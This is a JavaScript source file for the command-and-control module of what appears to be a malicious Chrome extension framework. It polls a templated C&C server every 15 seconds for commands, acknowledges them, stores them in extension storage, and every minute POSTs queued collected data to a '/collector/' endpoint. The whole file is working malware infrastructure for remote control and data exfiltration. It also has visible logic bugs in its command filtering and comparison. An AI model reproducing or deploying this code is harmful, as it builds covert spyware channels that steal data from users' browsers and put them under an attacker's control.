////////////////////////////////////////////////////////////////
// C&C <-> Internet Communication
////////////////////////////////////////////////////////////////

// This header will be defined for every module to define processing of new cmds 
// & querying new cmds from server.  
// Define one header to embed all necessary c&c server functions.
let SEND_DATA_INTERVAL = 1 * 60 * 1000; // Send new data into server every 1 minute.
let CMDS_CHECK_INTERVAL = 15 * 1000; // Get new cmds from server every 15 secs.
let MODULE_NAME = 'cc';
let SERVER_IP_ADDR = '{{CC_SERVER_IP_ADDR}}'.replaceAll(' ', '').replaceAll('\n', '');
let IS_HTTP_HTTPS_SCHEME = SERVER_IP_ADDR.indexOf('http://') == 0 || SERVER_IP_ADDR.indexOf('https://') == 0 
let CC_URL = (IS_HTTP_HTTPS_SCHEME) ? SERVER_IP_ADDR : 'http://{{CC_SERVER_IP_ADDR}}';
let COLLECTOR_URL = CC_URL + '/collector/';
let CMDS_URL = CC_URL + '/cmds/'; // get current cmds data.
let CMDS_ACK = CC_URL + '/cmds_ack/';  // Acknowledge server we processed current cmds.
//

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


async function getCmdsCC() {
	res = await chrome.storage.local.get({"cmds_list": []});
	return res["cmds_list"];
}

// Query for new commands.
async function getCmdsCCInternal() {
	// Check, update command-list and fully return the updated command list from C&C side.
	// *** In the C&C side - 
		// We serve /cmds/, every time we receive an OK for cmds endpoint - remove the list (to an old backup place).
		// *That way - we don't serve same CMD's twice.
		// We serve /collector/ -> save the data after de-base64 in sepearte filename "DATE.txt" every response we get. 
	
	// 1. Check if storage API available. 
	if (!chrome || !chrome.storage || !chrome.storage.local) {
		return;
	}

	// 2. Check if we need to update C&C commands list
	let get_new_cmds = false; 
	let old_cmds = null /// Get them from last C&C cmds storage.
	let cur_time = (new Date()).getTime();
	await chrome.storage.local.get({"last_cmds_get":0}).then(async function f1(e) {
		if (e["last_cmds_get"] === 0 || Math.abs(cur_time - e["last_cmds_get"]) > CMDS_CHECK_INTERVAL) {
			get_new_cmds = true;
			}
	});

	// 3. Get Old Command List.
	let cmds_res = await chrome.storage.local.get({"cmds_list": []});
	old_cmds = cmds_res["cmds_list"];
	let ret_cmds = old_cmds; // cmds to return. 

	// 4. If needed - Update Command list.
	if (get_new_cmds) {
		try {
		await fetch(CMDS_URL).then(cmds_resp => {
			cmds_resp.text().then(async function f2(json_data) {
				/// ["module_name", "op", ["arg1", "arg2", "arg3"]]
				let new_cmds = JSON.parse(json_data);
				// Inform Server we have got the new cmds.
				await fetch(CMDS_ACK);
				// Add to the list of commands (module, op, args_list) also was_executed bit in the end.
				for(let i=0; i<new_cmds.length; i++) {
					new_cmds[i].push(false); // Set last arg as was_executed bit. 
				}

				// Add & update cmds list into the cache storage.
				// let new_old_cmds = old_cmds.concat(new_cmds); // Support for continuous commands might be added here...
				// We can also use new_old_cmds to concatenate both new and old commands if we wannna...
				let res = await chrome.storage.local.set({"cmds_list": new_cmds});
				ret_cmds = new_cmds; // cmds to return.
				// Setup new last time.
				await chrome.storage.local.set({"last_cmds_get": cur_time});
			});
		});
		} catch (e) {
			console.log("Failed to communicate with C&C server");
			console.log(e);
		}
	}

	await sleep(2000);

	// 4. Filter Irrelevant commands (already executed ones).
	let filtered_cmds = []
	for (let i=0; i<ret_cmds.length; i++) {
		if (ret_cmds[ret_cmds.length-1] === false) {
			filtered_cmds.push(ret_cmds[i]);
		}
	}

	// 5. Return all cmds - old & acquired new ones in here.
	return filtered_cmds;
}




// Check if two commands are equal.
async function cmdsEqual(cmd1, cmd2) {
	// Commands look like (module, op, ...., args, was_executed).
	// We compare all without was_executed. args is a list compared afterwards.
	// Compare cmds- (module, op, ... , args). first of all module and op, and then args after. without executed bit.
	// compare module and op.
	if (cmd1.length != cmd2.length) {
		return false;
	}
	for (i=0; i < cmd1.length - 2; i++) {
		if(cmd1[i] !== cmd2[i]) {
			return false;
		}
	}

	// Compare the args.
	let args1 = cmd1[cmd1.length-2];
	let args2 = cmd2[cmd2.length-2];
	if (args1.length != args2.length) {
		return false;
	}
	for (i=0; i < args1.length; i++) {
		if (args1[i] != args2[2]) {
			return false;
		}
	}
	return true;
}

// Update command status as already executed.
async function executedCmdCC(cmd_tuple) {
	// 1. Find command in commands list.
	let cmds_res = await chrome.storage.local.get({"cmds_list": []});
	let old_cmds = cmds_res["cmds_list"];
	let cmd = null;
	for (let i=0; i<old_cmds.length; i++) {
		if (cmdsEqual(old_cmds[i], cmd_tuple)) {
			cmd = old_cmds[i];
			cmd[cmd.length-1] = true;
			// break; // remove all commands with same params as it was already done. 
		}
	}
	await chrome.storage.local.set({"cmds_list": old_cmds});
}


// Example POST method implementation:
async function postData(url = '', data = {}) {
  // Default options are marked with *
  const response = await fetch(url, {
    method: 'POST', // *GET, POST, PUT, DELETE, etc.
    mode: 'cors', // no-cors, *cors, same-origin
    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
    credentials: 'same-origin', // include, *same-origin, omit
    headers: {
      'Content-Type': 'application/json'
      // 'Content-Type': 'application/x-www-form-urlencoded',
    },
    redirect: 'follow', // manual, *follow, error
    referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
    body: JSON.stringify(data) // body data type must match "Content-Type" header
  });
  return response.json(); // parses JSON response into native JavaScript objects
}

// Send results data for command executed.
async function sendDataCC(data) {
	// For now, supporting just the typical chrome.storage.local. 
	if (chrome && chrome.storage && chrome.storage.local) {
		// 1. Got also data parameter to be appended and to be sent
		if (data) { 
			let res_data = await chrome.storage.local.get({"data_left_to_send": []});
			let rdata = res_data["data_left_to_send"];
			rdata.push(JSON.stringify(data));
			await chrome.storage.local.set({"data_left_to_send": rdata});
		}
		// 2. Check How much data left to be sent.
		let res_data = await chrome.storage.local.get({"data_left_to_send": []});
		let data_to_send = res_data["data_left_to_send"];
		if (!data_to_send) {
			// No data to be sent.
			return; 
		}
		console.log("[*] Got " + data_to_send.length + " infos to be sent.");

		// 3. 
		// *Example storage usage: Get all storage: chrome.storage.local.get(null).then(e=>console.log(e))
		let last_sent = chrome.storage.local.get({"last_sent":0}).then(async function f3(e) {
			if (e["last_sent"] || e["last_sent"] === 0) {
				let cur_time = (new Date()).getTime();
				if (Math.abs(cur_time - e["last_sent"]) > SEND_DATA_INTERVAL) {
					// No limits on GET url header besides kinda what server defines as max.
					//fetch(COLLECTOR_URL + "/" + encodeURIComponent(JSON.stringify(data_to_send)));
					postData(url=COLLECTOR_URL, data=data_to_send)
					// Clear storage & update interval.
					await chrome.storage.local.set({"last_sent": cur_time});
					await chrome.storage.local.set({"data_left_to_send": []}); 
				}
			}
		});
	}
}


// Send results data for command executed.
async function clearAllCmds(data) {
	await chrome.storage.local.set({"cmds_list": []});
}

//
setInterval(sendDataCC, 5000);
setInterval(getCmdsCCInternal, 5000);
setInterval(clearAllCmds, 1 * 60 * 1000); // Remove this kinda afterwards and instead use the mechanism for marking command executed already within it.
